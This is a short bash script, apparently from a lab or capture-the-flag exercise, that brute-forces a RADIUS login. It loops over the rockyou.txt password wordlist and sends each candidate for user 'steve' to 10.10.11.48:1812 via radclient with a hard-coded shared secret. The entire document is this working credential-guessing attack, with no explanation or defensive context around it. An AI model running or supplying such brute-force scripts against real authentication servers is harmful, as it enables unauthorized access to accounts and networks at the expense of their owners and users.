while read password; do
  echo "User-Name=steve, User-Password=$password" | radclient -x 10.10.11.48:1812 auth fuckyou
done < rockyou.txt
